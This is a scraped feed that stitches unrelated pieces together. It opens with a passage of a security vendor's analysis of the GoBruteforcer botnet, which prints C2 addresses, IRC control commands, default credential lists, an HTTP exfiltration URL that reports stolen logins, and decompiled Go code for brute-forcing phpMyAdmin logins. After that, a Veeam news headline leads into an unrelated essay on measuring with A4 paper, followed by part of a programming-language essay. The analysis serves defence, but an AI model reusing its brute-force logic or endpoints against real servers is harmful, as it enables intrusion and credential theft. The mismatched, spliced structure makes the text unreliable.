    buf = malloc(cmdlen);
    memcpy(buf, label, used);
    memset(buf + used, 0, pad);
    if (used + pad > cmdlen);
    memmove(dst, buf, cmdlen);
    free(buf);
}
As a result, if we list processes using the  utility, we see  instead of the original command line: — The “ps” utility shows the fake command line.Initialization and connecting to serverWhen the binary starts executing, the  funcion builds the bot configuration. The configuration includes a list of C2 / IRC server endpoints (IP addresses or domains), a port for each entry, a generated visible nickname used for IRC registration, and the default IRC channel name.In the observed samples, there are between 1-3 obfuscated C2 entries. In the active 2025 campaign, we observed the following C2 server addresses: — Obfuscated C2 server address list.The bot cycles through the hardcoded C2 list in a round-robin, going to the next C2 server and trying to connect. Usually, the IRC servers used by the malware run on the TCP port .Immediately after the TCP connection completes, the bot sends two IRC commands:NICK <nick>
USER K 0 * :2025
For the  command, the bot uses hardcoded values for the fields: is used for the  field. is used for the  field.This means that raw IRC messages in which the IRC server refers to the bot look like::<nick>!K@<host> JOIN #bots-x86
Most probably, the  field is for the release year or the version number, as in earlier bots this value was set to .Optionally, the bot can also send the  message, if enabled in the configuration for the server. In the analyzed samples, this option was switched off.The nickname generated by the bot has the following format:M|<flag>|<random-6-digits>|<cpu_num>c|<hostname>
 — Constant prefix used by this bot family. — A small flag value (observed as a single digit, e.g., indicating root/non-root). — A six-digit random identifier (regenerated if the nick is already in use). — A numeric value representing the number of CPUs on the infected machine, suffixed with . — The sanitized device hostname, truncated to 10 characters.After the bot registers, the C2 IRC server immediately replies with the normal connection numerics and then performs an automatic nick rewrite. The exact observed sequence::server.com 001 <nick> :
:server.com 002 <nick> :
:server.com 003 <nick> :
:server.com 005 <nick> CHANTYPES=# PREFIX=(o)@ CHANMODES=o NETWORK=server :are supported by this server
:server.com 422 <nick> :
:<nick> NICK <country_code>|<nick>
001–003 (welcome messages). Normally these contain a greeting, the server version, and creation date. Here they are empty, which hides useful information about the server. The server declares a very restricted rule set: there is only one type of channel (those starting with ), and there are only two types of users — the operator and everyone else. Operators can see and control everything, while regular users are severely limited: they cannot see each other’s presence or messages, and effectively can only communicate with the operator. This design prevents bots from “talking” to each other and ensures that only the operator can control them. Finally, the server forces the bot to change its nickname by adding a two-letter country code such as . Most likely the country code is obtained from the bot’s IP address and allows the operator to quickly group bots by geography.The IRC server used in the current campaign enforces a constrained policy and limits functionality for unauthenticated users. Only a small command set is allowed:Commands allowed for non-operators: , , , , , , , .Attempts to use other commands result in a  numeric (permission denied). The observed server message::server.com 481 <nick> :Permission Denied- You're not an IRC operator
Counteracting bot monitoring and hijackingAs mentioned earlier, the server is configured to prevent bots from seeing messages from other bots. Bots use direct  messages to send command execution results to the bot operator. (The list of commands and how they are handled will be described later.)This hides the botnet from monitoring agents and prevents the bot from being hijacked.With this configuration, the only way to send messages from one bot to another is to send a direct message addressed to its nickname. However, due to the random generation of 6-digit numeric sequences in nicknames, as well as our lack of knowledge of the hostnames and the geography of the victims, a large-scale bruteforce attack would be necessary to achieve this.In addition, besides the server restrictions, the bot itself enforces a check before processing any control command. The observed logic is:The bot only considers messages whose message text begins with the  prefix (commands are delivered as  in the trailing part of an IRC ).The bot inspects the full IRC prefix token (the raw  token that appears after the leading ). It searches that prefix for the substring  — i.e.,  immediately followed by . Only messages whose prefix contains  pass the check. If the substring is not present, the message is ignored.This functionality essentially allows bots to be managed only by an operator connected locally to the IRC server. Even if this restriction is circumvented, the two measures described above prevent bots from being controlled by an unauthorized party.The bot automatically joins a small set of persistent channels after a successful login. One channel is a global base channel (), and the others are architecture-specific channels. The observed channel names include:The per-architecture channels allow the operator to send commands only to bots running a specific architecture (e.g., push an x86-only payload to ).After the server sends the  welcome numeric, the bot waits a short time (3 seconds) and issues a  message for each channel in its persistent list. Example lines the bot sends include:JOIN #bots
JOIN #bots-x86
IRC Messages Handled by the BotThe bot processes the following types of IRC messages sent by the server: — Immediately replies with a PONG message. — Welcome message. When the bot receives this message, it sends  commands to connect to its persistent channels. — Nickname already in use. When received, the bot generates a new nickname and resends a  command. — The server forces a nickname change. The bot updates its internal state accordingly. — Notification that a user joined a channel. If it is the bot itself, it records the channel in its list. — Notification that the bot left a channel. The bot removes the channel from its list. — The bot is removed from a channel and deletes the channel from its list. — A direct message to the bot. These messages are used by the operator to issue commands (covered in the next section). — Error notification.The operator controls the bots using commands with a specific format. There are two accepted delivery forms:The operator controls the bots using commands with a specific format. There are two accepted delivery forms:Channel broadcast (targets all bots in a channel)::xx!x@127.0.0.1 PRIVMSG #bots-x86 :!<command> <args>
Direct (private) command to a specific bot nick::xx!x@127.0.0.1 PRIVMSG US|M|1|123456|4c|vps-123 :!<command> <args>
The following commands are supported: — join a channel.The bot accepts both channel name forms (with or without ) in the command argument. If the channel does not start with , the bot prepends . The bot sends  to the server and stores the channel in its persistent channel list (and rejoins when it reconnects). This command allows the operator to group bots by a feature, for example, bots hosted in a specific datacenter.:xx!x@127.0.0.1 PRIVMSG US|M|1|123456|4c|vps-123 :!join #bots-digitalocean — Leave the channel.The bot expects channel names with  in this handle. As a result of handling this command, the bot sends  and removes the channel from its persistent list. — List persistent channels.The bot replies to the command sender (using a private NOTICE message) with either a list of channels, or No persistent channels configured if the list is empty. # server -> bot

...It is important to note here that messages sent in this way are visible only to the botnet operator, are not visible in the channel, and cannot be received by other users or bots.Persistence and Single-Instance ControlThe rest of the functionality remains almost unchanged compared to previous versions.To maintain persistence on the system, the bot relies on cron, which restarts the binary every five minutes (). Before setting up cron jobs, the malware copies itself into several paths: — The list of cron jobs added by GoBruteforcer.To ensure that only one instance runs at a time, the bot uses a simple local socket-based mutex: it binds a socket to the loopback interface () on a fixed port and keeps the listener open. If the port is already in use, the new instance terminates. In the analyzed sample, the port  was used, although other samples employed different ports (for example, ), enabling the botnet operators to run two versions in parallel for testing updates.In this section, we examine the bruteforce module of the GoBruteforcer malware (2025 variant), which targets four service types (FTP, MySQL, PostgreSQL, and phpMyAdmin (PMA)) by systematically attempting to log in using credential lists. We describe how the malware selects target IP adresses, manages concurrency, and executes protocol-specific brute-force routines.Overall, the bruteforcer’s design balances speed (scanning tens of IP addresses per second) with stealth (skipping specific IP ranges, avoiding unnecessary reporting, and not saturating bandwidth).As seen with the IRC bot, the bruteforcer starts with a single-instance guard: It binds a TCP socket on the loopback interface to a fixed port (). If the port is already in use, it exits to prevent a second launch.The malware introduces a random delay between 10 and 400 seconds before beginning any activity.Next, the malware obtains the credential list and mode (one of , , , or ) from a C2 server at a URL hardcoded in the sample (the exact address may differ across samples):http://190.14.37[.]10/new.php
To make a request to the C2 server, the malware uses a specific User-Agent string:User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
The C2 server usually returns the output in the following form:mysql
appuser:
appuser:1q2w3e4r5t
appuser:test123
appuser:zing
appuser:anhyeuem
appuser:Qwerty12
appuser:10203
appuser:woaini
appuser:1111111
...
The first line indicates the mode, followed by a list of 200 lines containing  pairs.If the C2 server is unavailable, the malware falls back to the default  mode and a hardcoded list of seven  pairs:{
    "root:", "root:admin", "root:123", "root:1234",
    "root:pass", "root:password", "root:123456",
}
The bot launches a dedicated goroutine to poll its C2 server every 15 minutes for updates to the bruteforcing task and credentials list (with a faster 30-second retry loop on failure).The main bruteforce loop itself runs continuously unless stopped by the C2 server.Worker Pool and Concurrency ControlIn the main loop, GoBruteforcer maintains a fixed pool of worker goroutines that perform bruteforce tasks in parallel. The pool size is chosen based on the CPU architecture of the infected host. On 64-bit systems ( or ), the malware sets a target of  concurrent workers, whereas 32-bit or lower-end systems use fewer (e.g.  on ,  on ,  on others by default). This target is set once at startup and remains constant unless a stop command is issued by the C2 server. Each worker is a short-lived task that will scan a single IP address for a given service and then exit.The main controller seeds the pool by immediately launching the required number of goroutines and then continuously adds more. A counter is triggered every  to check how many workers are currently active. If the number dropped below the target (e.g. some finished their scan), the malware spawns new workers to make up the deficit. This way, the pool always hovers near the fixed concurrency level.The pool mechanism ensures a steady load and throughput – on x86-64 an infected host reliably keeps  approximately  parallel bruteforce threads running.Task loop and stop signalA central loop in the malware continuously monitors the mode provided by the C2 server (the service to bruteforce). If the mode switches to stop, the malware  shuts down the pool. To stop, it signals a cancellation context shared by all workers.Single-IP task per workerUpon starting, each worker goroutine takes a snapshot of the current bruteforcing “mode” (e.g., FTP or MySQL) and generates one target IP address to attack. It then executes the corresponding bruteforce routine for that IP (detailed in the protocol sections below) and exits. This means each thread handles at most one IP address from start to finish. By cycling workers in this one-IP-per-worker fashion, the malware naturally load-balances and avoids any single thread running for too long. The one-IP tasks also make it simple to maintain the target concurrency: As soon as a worker exits, a new one is spawned to pick up the next IP.Target IP Selection and FilteringFor each bruteforce attempt, GoBruteforcer selects a random IPv4 address as the target. However, it intelligently filters out IPs that belong to non-routable networks or specific ranges the operators appear to avoid. The IP generation function essentially performs an “infinite dice throw” over the 4 octets until it comes up with an address that is not in any forbidden range. This prevents wasting time on addresses that cannot be reached or may attract unwanted attention. — Generation and filtering random IP addresses.The malware skips the following address categoriesby checking the octets against hardcoded conditions:Private/Non-Internet networks: All RFC1918 private IPv4 ranges are excluded. This covers 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16. It also excludes IP addresses in 100.64.0.0/10 (carrier-grade NAT space), the local loopback 127.0.0.0/8, and the non-routed “this network” block 0.0.0.0/8. Similarly, link-local APIPA addresses 169.254.0.0/16 are skipped. None of these are valid targets on the public Internet. The malware avoids addresses reserved for documentation and testing. For example, it excludes 198.18.0.0/15 (set aside for RFC2544 benchmarking tests). It also broadly filters out  by rejecting any address with a first octet ≥ 224 that are not used for regular unicast hosts.Major cloud provider space: The IP filter also blocks several /8 ranges that are heavily used by Amazon Web Services: 3.0.0.0/8, 15.0.0.0/8, 16.0.0.0/8, 56.0.0.0/8. Cloud environments often have active honeypots and aggressive abuse response; the botnet authors appear to deem these targets as either low-priority or high-risk.“Sensitive” US government networks: A notable feature is a built-in blacklist of 13 specific /8 blocks historically associated with the U.S. Department of Defense (DoD) and related agencies. These include IP addresses starting with 6, 7, 11, 21, 22, 26, 28, 29, 30, 33, 55, 214, or 215. Such networks (e.g. 6.0.0.0/8 or 30.0.0.0/8) are largely U.S. military addresses. By skipping them, the bot avoids drawing unnecessary attention and likely sidesteps government-run honeypots and sensors, reducing the chances of the botnet being monitored or disrupted.Each bruteforce task begins with a 2-second timeout port probe to verify that the target service is reachable. The malware can check FTP (21/tcp), PostgreSQL (5432/tcp), phpMyAdmin (HTTP on 80/tcp), and MySQL (3306/tcp). The task only proceeds with testing credentials if the probe succeeds.All bruteforce attempts use unencrypted connections. This approach misses targets that enforce encryption (e.g., FTPS, HTTPS-only phpMyAdmin, or MySQL/PostgreSQL with mandatory TLS), but the operators likely judge the plaintext exposure pool is large enough to justify the speed and simplicity gains.Successful bruteforce hits are exfiltrated via a plain HTTP GET request to the C2’s  endpoint (often on port ), with details encoded in the query string: – service code (1 – for , 2 – for , 3 – for , 4 – for ). – extra metadata (e.g., PMA base path).http://190.14.37.10:9090/pst?i=123.123.123.1236&c=4&u=postgres&p=12345678910&e=
Requests use a hardcoded User-Agent string:User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Unlike the other protocols, FTP does not rely on C2-provided credentials. The malware binary includes a hardcoded list of 22 username:password pairs that it always uses for FTP bruteforcing. These appear to be commonly used or default FTP accounts:apache2:apache2
apache:apache
blog:blog
daemon:xampp
daemon:lampp
daemon:1234

www:www
It’s important to note that the list of credentials received from the C2 server is completely ignored. Given that the C2 server transmits a list of credentials for bruteforce testing regardless of the selected mode, we can conclude that the malware developers made a mistake, and this behavior is most likely a bug.The order of 22 built-in credentials is randomized for each run. The malware makes a copy of the built-in list and calls . After shuffling, it inserts the  entry at the top of the list. This means that for every target IP, the order of the real credentials is different, but the first attempt is always the  user with password .Upon a successful FTP login, the malware reports the found username and password pair to its C2. It is noteworthy that if the credential  succeeded, the malware explicitly suppresses reporting. After any success ( or otherwise), the FTP bruteforce thread exits immediately without attempting any further passwords on that host.The presence of the odd  credential (which is not a default in any known FTP server) suggests it is a deliberate sentinel by the attackers. It may serve as a kill-switch or fast-exit for machines under the attackers’ control. If they pre-install an FTP user  with password  on certain systems, the bot immediately finds it and stops scanning that machine.For MySQL bruteforcing, the list of credentials is drawn from the bot’s global list, which is populated via C2 commands. If the bot fails to fetch instructions from C2 on startup, it falls back to a built-in default list containing a few very common MySQL credentials as described above.Before usage, the credential list is copied and shuffled so that each worker iterates through the credentials in a random order.The malware uses Go’s MySQL driver ( with the MySQL connector) for attempted logins. For each credential in the list, it constructs a  string with the format:<user>:<pass>@tcp(<ip>:3306)/?timeout=5s&collation=utf8_general_ci
The first accepted login short-circuits continues the attempt and is reported to the C2 server.Bruteforcing PostgreSQL (port ) follows almost the same pattern as MySQL, with minor differences primarily in the connection string and protocol specifics.It uses the same credential list provided by C2. Just like MySQL, the list is randomized per worker.For each , the malware constructs a Postgres connection URL of the form:postgres://<user>:<pass>@<ip>:5432/?sslmode=disable
Notably, it appends  to force a plaintext connection.The phpMyAdmin bruteforce logic is more complex, as it involves navigating a web interface on HTTP. PhpMyAdmin (PMA) is a web-based MySQL administration panel, typically accessed via a URL path on a web server. The malware’s PMA module is designed to find these panels on targets and then attempt to log in through the HTML form.The bot only proceeds if the target’s TCP/80 (HTTP) port is open. Interestingly, it does not appear to try HTTPS/443 in this variant – the code explicitly checks port 80.The malware contains a large built-in list of possible phpMyAdmin installation paths (directory names). In our sample, this list has approximately 80 entries covering multiple common directory variants. Examples include standard names like  or , numeric versions like , obscured names like  or , and even WordPress plugin paths like /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/ (87 different paths in total). This comprehensive list suggests the attackers want to find PMA even if the administrator renamed the folder or installed a specific version. – The deobfuscated list of PhpMyAdmin paths found in the sample (partial).For each candidate path, the malware tries to detect if phpMyAdmin is present before attempting a login. It creates an HTTP client (with a cookie jar) and sends a GET request to: http://<ip>/<base>/index.php?lang=en. The custom  is set to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.3k (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36, likely to blend in as normal traffic.When a response is received, the HTML is loaded and the code checks for indicators of a phpMyAdmin login page:Extracts the page <title> and looks for the substring “phpMyAdmin” (to confirm this is likely a PMA page).Ensures the title does not contain “setup” (to avoid confusing the setup page or other admin pages with the actual login).Searches the page body for known PMA UI elements. In particular, it looks for either the  theme directory, or references to , or  in the HTML. These are artifacts of phpMyAdmin’s login page (for example, PMA’s default theme is named , and  is a frame or script loaded post-login in older versions). If any of those markers are found, it sets a flag so that the page content “looks like” phpMyAdmin.// Decompiled Go-pseudocode
    title := ExtractBetween(body, "<title>", "</title>")

    hasPHP   := strings.Contains(title, "phpMyAdmin")
    hasSetup := strings.Contains(title, "setup")

    themeOK := false
    if strings.Contains(body, "/pmahomme/") {
        themeOK = true
    } else if strings.Contains(body, "phpmyadmin.css") {
        themeOK = true
    } else if strings.Contains(body, "navigation.php") {
        themeOK = true
    }

    if !(hasPHP && !hasSetup && themeOK) {
        continue
    }
When a likely phpMyAdmin page is found, the malware next tries to determine the PMA version (or at least a major version hint) from the HTML. It searches the HTML for a string like  and if found, parses out the version number that follows . This typically yields a numeric value (for example, “5.2.1”).The bruteforce method depends on both the page content and this version.For versions < 4.9, it uses a GET-based login attempt method.For for newer versions, it uses a POST-based login method.Bruteforce via HTTP GET (for older versions, <4.9)If the bot chooses the GET method, it attempts to log in by sending the credentials as URL parameters. It appends ?lang=en&pma_username=<user>&pma_password=<pass> to the same login URL and issues a GET request for each credential. The code considers the login successful if the resulting page contains  or the  contains “phpMyAdmin 2/3/4/5” markers.// Decompiled Go-pseudocode
    loginURL := "http://" + host + "/" + base +
        "/index.php?lang=en&pma_username=" + url.QueryEscape(user) + "&pma_password=" + url.QueryEscape(pass)

    req, err := CreateHTTPReqWithUA(c, "GET", loginURL, nil)

    resp, err := c.Do(req)
    b, _ := io.ReadAll(resp.Body)
    resp.Body.Close()

    page := string(b)
    title := ExtractBetween(page, "<title>", "</title>")

    ok := false
    if strings.Index(page, "Welcome to") >= 0 {
        ok = true
    } else if strings.Index(title, "phpMyAdmin 2") >= 0 ||
          strings.Index(title, "phpMyAdmin 3") >= 0 ||
          strings.Index(title, "phpMyAdmin 4") >= 0 ||
          strings.Index(title, "phpMyAdmin 5") >= 0 {
        ok = true
    }

    if ok {
        SendPst(1, host, user, pass, base)
        return true
    }
Brute-force via HTTP POST (for PMA ≥4.9)If using the POST method (for newer versions), the malware must handle an HTML login form. The steps are: First, it fetches the login page (if not already fetched) to retrieve a CSRF token. The bot parses the HTML for an <input name="token" value="<tokenval>" /> and stores the token value if present. (phpMyAdmin’s login form includes a hidden token in newer versions to prevent CSRF; the malware grabs it to include in the login POST.) The bot prepares an HTTP POST request to the same  URL. It sets the form fields , ,  (selecting the first server, in case PMA is managing multiple MySQL servers), and includes the  if it obtained one. It sends this request with the appropriate Content-Type header and using the same User-Agent. The timeout for the HTTP client remains 3 seconds, so each POST is quick. After each POST attempt, the malware reads the response body. It then uses the  as the GET method to decide if the login succeeded: looking for “Welcome to” in the page or certain phpMyAdmin version strings in the title. If those are found, it deems the credential valid and sends a report with the IP, creds, and base path. It then stops further attempts.If the credential was not successful, it continues with the next username:password, reusing the same token if the token doesn’t change. (The code grabs the token once per session; it does not fetch a new token for each attempt, which might be a weakness if the token expires or is invalidated after a login failure. However, many versions of PMA do not invalidate the token on wrong password, so this approach could still work.)GoBruteforcer runs as a steady, architecture-tuned worker pool. The pool size is large enough to pipeline many attempts but capped to avoid runaway threads or saturating the host. In the wild, a single x86-64 host sustained roughly 20 IP/s during an FTP campaign, showing the scanner spends most cycles failing fast on silent hosts. That design keeps throughput high while keeping per-host bandwidth low: In observed FTP scans, outbound traffic remained under approximately 64 kb/s and inbound under approximately 32 kb/s.GoBruteforcer exemplifies a broader and persistent problem: The combination of exposed infrastructure, weak credentials, and increasingly automated tools. While the botnet itself is technically straightforward, its operators benefit from the vast number of misconfigured services that remain online. As generative AI further lowers the barrier to server deployment, the risk of insecure defaults will likely increase. Addressing this class of threats requires not only detection and takedown efforts, but also renewed attention to secure configuration practices, credential hygiene, and continuous exposure management.GoBruteforcer is a perfect example of how threat actors use “low hanging fruit” such as seemingly unsophisticated tactics (weak password attacks, random IP addresses) to compromise large numbers of internet-facing systems with relatively little effort. This reinforces the need for organizations to monitor and secure their internet-facing services and enforce robust authentication methods.Check Point Threat Emulation and Harmony Endpoint provide comprehensive coverage of attack tactics, file types, and operating systems and protect against the attacks and threats described in this report.pool.breakfastidentity[.]ru7423b6424b26c7a32ae2388bc23bef386c30e9a6acad2b63966188cb49c283ad8fd41cb9d73cb68da89b67e9c28228886b8a4a5858c12d5bb1bffb3c4addca7cbd219811c81247ae0b6372662da28eab6135ece34716064facd501c45a3f4c0db0c6fe570647fdedd72c920bb40621fdb0c55ed217955557ea7c27544186aeecab468da7e50e6e73b04b738f636da150d75007f140e468bf75bc95e8592468e54fbea12c44f56d5733494455a0426b25db9f8813992948c5fbb28f38c636744664e02ffb89ae0083f4414ef8a72e6367bf813701b95e3d316e3dfbdb415562c4c7886535973fd9911f8979355eae5f5abef29a89039c179842385cc574dfa166]]></content:encoded></item><item><title>New Veeam vulnerabilities expose backup servers to RCE attacks</title><link>https://www.bleepingcomputer.com/news/security/new-veeam-vulnerabilities-expose-backup-servers-to-rce-attacks/</link><author></author><category>security</category><pubDate>Wed, 7 Jan 2026 13:06:11 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

  I sometimes resort to a rather common measuring technique that is
  neither fast, nor accurate, nor recommended by any standards body
  and yet it hasn't failed me whenever I have had to use it.  I will
  describe it here, though calling it a technique might be overselling
  it.  Please do not use it for installing kitchen cabinets or
  anything that will stare back at you every day for the next ten
  years. It involves one tool: a sheet of A4 paper.

  Like most sensible people with a reasonable sense of priorities, I
  do not carry a ruler with me wherever I go.  Nevertheless, I often
  find myself needing to measure something at short notice, usually in
  situations where a certain amount of inaccuracy is entirely
  forgivable.  When I cannot easily fetch a ruler, I end up doing what
  many people do and reach for the next best thing, which for me is a
  sheet of A4 paper, available in abundant supply where I live.

  From photocopying night-sky charts to serving as a scratch pad for
  working through mathematical proofs, A4 paper has been a trusted
  companion since my childhood days.  I use it often.  If I am
  carrying a bag, there is almost always some A4 paper inside: perhaps
  a printed research paper or a mathematical problem I have worked on
  recently and need to chew on a bit more during my next train ride.

  The dimensions of A4 paper are the solution to a simple, elegant
  problem.  Imagine designing a sheet of paper such that, when you cut
  it in half parallel to its shorter side, both halves have exactly
  the same aspect ratio as the original.  In other words, if the
  shorter side has length \( x \) and the longer side has length \( y
 , \) then

  \[
    \frac{y}{x} = \frac{x}{y / 2}
  \]

  which gives us

  \[
    \frac{y}{x} = \sqrt{2}.
  \]

  Test it out.  Suppose we have \( y/x = \sqrt{2}.  \)  We cut the
  paper in half parallel to the shorter side to get two halves, each
  with shorter side \( x' = y / 2 = x \sqrt{2} / 2 = x / \sqrt{2} \)
  and longer side \( y' = x.  \)  Then indeed

  \[
    \frac{y'}{x'}
    = \frac{x}{x / \sqrt{2}}
    = \sqrt{2}.
  \]

  In fact, we can keep cutting the halves like this and we'll keep
  getting even smaller sheets with the aspect ratio \( \sqrt{2} \)
  intact.  To summarise, when a sheet of paper has the aspect ratio \(
  \sqrt{2}, \) bisecting it parallel to the shorter side leaves us
  with two halves that preserve the aspect ratio.  A4 paper has this
  property.

  But what are the exact dimensions of A4 and why is it called A4?
  What does 4 mean here?  Like most good answers, this one too begins
  by considering the numbers \( 0 \) and \( 1.  \)  Let me elaborate.

  Let us say we want to make a sheet of paper that is \( 1 \,
  \mathrm{m}^2 \) in area and has the aspect-ratio-preserving property
  that we just discussed.  What should its dimensions be?  We want

  \[
    xy = 1 \, \mathrm{m}^2
  \]

  subject to the condition

  \[
    \frac{y}{x} = \sqrt{2}.
  \]

  Solving these two equations gives us

  \[
    x^2 = \frac{1}{\sqrt{2}} \, \mathrm{m}^2
  \]

  from which we obtain

  \[
    x = \frac{1}{\sqrt[4]{2}} \, \mathrm{m}, \quad
    y = \sqrt[4]{2} \, \mathrm{m}.
  \]

  Up to three decimal places, this amounts to

  \[
    x = 0.841 \, \mathrm{m}, \quad
    y = 1.189 \, \mathrm{m}.
  \]

  These are the dimensions of A0 paper.  They are precisely the
  dimensions specified by the ISO standard for it.  It is quite large
  to scribble mathematical solutions on, unless your goal is to make a
  spectacle of yourself and cause your friends and family to reassess
  your sanity.  So we need something smaller that allows us to work in
  peace, without inviting commentary or concerns from passersby.  We
  take the A0 paper of size

  \[
    84.1 \, \mathrm{cm} \times 118.9 \, \mathrm{cm}
  \]

  and bisect it to get A1 paper of size

  \[
    59.4 \, \mathrm{cm} \times 84.1 \, \mathrm{cm}.
  \]

  Then we bisect it again to get A2 paper with dimensions

  \[
    42.0 \, \mathrm{cm} \times 59.4 \, \mathrm{cm}.
  \]

  And once again to get A3 paper with dimensions

  \[
    29.7 \, \mathrm{cm} \times 42.0 \, \mathrm{cm}.
  \]

  And then once again to get A4 paper with dimensions

  \[
    21.0 \, \mathrm{cm} \times 29.7 \, \mathrm{cm}.
  \]

  There we have it.  The dimensions of A4 paper.  These numbers are
  etched in my memory like the multiplication table of \( 1.  \)  We
  can keep going further to get A5, A6, etc.  We could, in theory, go
  all the way up to A\( \infty.  \)  Hold on, I think I hear someone
  heckle.  What's that?  Oh, we can't go all the way to A\( \infty?  \)
  Something about atoms, was it?  Hmm.  Security!  Where's security?
  Ah yes, thank you, sir.  Please show this gentleman out, would you?

  Sorry for the interruption, ladies and gentlemen.  Phew!  That
  fellow!  Atoms?  Honestly.  We, the mathematically inclined, are not
  particularly concerned with such trivial limitations.  We drink our
  tea from doughnuts.  We are not going to let the size of atoms
  dictate matters, now are we?

  So I was saying that we can bisect our paper like this and go all
  the way to A\( \infty.  \)  That reminds me.  Last night I was at a
  bar in Hoxton and I saw an infinite number of mathematicians walk
  in.  The first one asked, "Sorry to bother you, but would it be
  possible to have a sheet of A0 paper?  I just need something to
  scribble a few equations on."  The second one asked, "If you happen
  to have one spare, could I please have an A1 sheet?"  The third one
  said, "An A2 would be perfectly fine for me, thank you."  Before the
  fourth one could ask, the bartender disappeared into the back for a
  moment and emerged with two sheets of A0 paper and said, "Right.
  That should do it.  Do know your limits and split these between
  yourselves."

  In general, a sheet of A\( n \) paper has the dimensions

  \[
    2^{-(2n + 1)/4} \, \mathrm{m} \times
    2^{-(2n - 1)/4} \, \mathrm{m}.
  \]

  If we plug in \( n = 4, \) we indeed get the dimensions of A4 paper:

  \[
    0.210 \, \mathrm{m} \times 0.297 \, \mathrm{m}.
  \]

  Let us now return to the business of measuring things.  As I
  mentioned earlier, the dimensions of A4 are lodged firmly into my
  memory.  Getting hold of a sheet of A4 paper is rarely a challenge
  where I live.  I have accumulated a number of A4 paper stories over
  the years.  Let me share a recent one.  I was hanging out with a few
  folks of the nerd variety one afternoon when the conversation
  drifted, as it sometimes does, to a nearby computer monitor that
  happened to be turned off.  At some point, someone confidently
  declared that the screen in front of us was 27 inches.  That sounded
  plausible but we wanted to confirm it.  So I reached for my trusted
  measuring instrument: an A4 sheet of paper.  What followed was
  neither fast, nor especially precise, but it was more than adequate
  for settling the matter at hand.

  I lined up the longer edge of the A4 sheet with the width of the
  monitor.  One length.  Then I repositioned it and measured a second
  length.  The screen was still sticking out slightly at the end.  By
  eye, drawing on an entirely unjustified confidence built from years
  of measuring things that never needed measuring, I estimated the
  remaining bit at about \( 1 \, \mathrm{cm}.  \)  That gives us a
  width of

  \[
    29.7 \, \mathrm{cm} +
    29.7 \, \mathrm{cm} +
     1.0 \, \mathrm{cm}
    =
    60.4 \, \mathrm{cm}.
  \]

  Let us round that down to \( 60 \, \mathrm{cm}.  \)  For the height,
  I switched to the shorter edge.  One full \( 21 \, \mathrm{cm} \)
  fit easily.  For the remainder, I folded the paper parallel to the
  shorter side, producing an A5-sized rectangle with dimensions \(
  14.8 \, \mathrm{cm} \times 21.0 \, \mathrm{cm}.  \)  Using the \(
  14.8 \, \mathrm{cm} \) edge, I discovered that it overshot the top
  of the screen slightly.  Again, by eye, I estimated the excess at
  around \( 2 \, \mathrm{cm}.  \)  That gives us

  \[
    21.0 \, \mathrm{cm} +
    14.8 \, \mathrm{cm}
    -2.0 \, \mathrm{cm}
    =
    33.8 \, \mathrm{cm}.
  \]

  Let us round this up to \( 34 \, \mathrm{cm}.  \)  The ratio \( 60 /
  34 \approx 1.76 \) is quite close to \( 16/9, \) a popular aspect
  ratio of modern displays.  At this point the measurements were
  looking good.  So far, the paper had not embarrassed itself.
  Invoking the wisdom of the Pythagoreans, we can now estimate the
  diagonal as

  \[
    \sqrt{(60 \, \mathrm{cm})^2 + (34 \, \mathrm{cm})^2}
    \approx 68.9 \,\mathrm{cm}.
  \]

  Finally, there is the small matter of units.  One inch is \( 2.54 \,
  \mathrm{cm}, \) another figure that has embedded itself in my head.
  Dividing \( 68.9 \) by \( 2.54 \) gives us roughly \( 27.2 \,
  \mathrm{in}.  \)  So yes.  It was indeed a \( 27 \)-inch display.  My
  elaborate exercise in showing off my A4 paper skills was now
  complete.  Nobody said anything.  A few people looked away in
  silence.  I assumed they were reflecting.  I am sure they were
  impressed deep down.  Or perhaps... no, no.  They were definitely
  impressed.  I am sure.

  Hold on.  I think I hear another heckle.  What is that?  There are
  mobile phone apps that can measure things now?  Really?  Right.
  Security.  Where's security?

Write Libraries Instead” (2016)</title><link>https://lbstanza.org/purpose_of_programming_languages.html</link><author>teleforce</author><category>dev</category><pubDate>Wed, 7 Jan 2026 12:29:11 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Patrick S. Li - May 29, 2016I had a friend tell me recently that all programming languages seem very similar to each other. They all have variables, and arrays, a few loop constructs, functions, and some arithmetic constructs. Sure, some languages have fancier features like first-class functions or coroutines, but he doesn't consider himself an expert programmer anyway and doesn't use those features.What  makes a programming language productive for him, he says, are the libraries it comes with. For example, he got into programming by using the popular  web framework. There is no way that he could have written a full database-driven web stack by himself, nor is he interested in doing so. But thanks to Ruby on Rails, he doesn't have to! So he said that he has no particular opinion about the Ruby programming language, but he absolutely loves Rails. The vast majority of programmers are non-experts, like himself, and the largest gains in productivity for non-experts come from having a wide spectrum of easy-to-use libraries. Subtle language features like first-class functions, and object systems, are lost on them because they don't really use them anyway. Computer scientists should really be spending their time developing new libraries rather than inventing new programming languages.My friend's opinion about programming languages is a common one, and I have heard it repeatedly from experts and non-experts alike. Being a language designer myself, I, of course, don't share this opinion. Here is what I consider to be the purpose of a general-purpose programming language.To start off, I would say that my friend's opinion is completely correct, just incomplete. The greatest productivity gains  indeed the result of having a wide spectrum of libraries. Ruby on Rails is a fantastic framework, and it has enabled thousands (if not millions) of non-experts to build sophisticated websites quickly. So the natural question then is, why isn't there now a Rails framework for every programming language? Some languages that are semantically similar to Ruby do have their own web frameworks. Python, for example, has Django. But as of now, there is  no decent web framework for Java that is as easy to use as Ruby on Rails. Why is that? Are Java developers just not as competent as Ruby programmers? If David Hansson could design and develop Rails by himself, why can't a group of programmers just copy the design to Java? What makes this even more embarrassing is the fact that Java initially marketed itself as  web programming language, because of its applet technology. To emphasize this point, let me add that there is no good web framework for C either, and it is unlikely that there ever will be. Let me assure you that it's not because C programmers are worse than Ruby programmers. Economics is not the reason either. The Tiobe index lists Java and C as the most widely used programming languages today, with Ruby coming in eighth place. There are  more Java and C programmers than there are Ruby programmers. If someone would just write Java on Rails their framework would have many times more users than 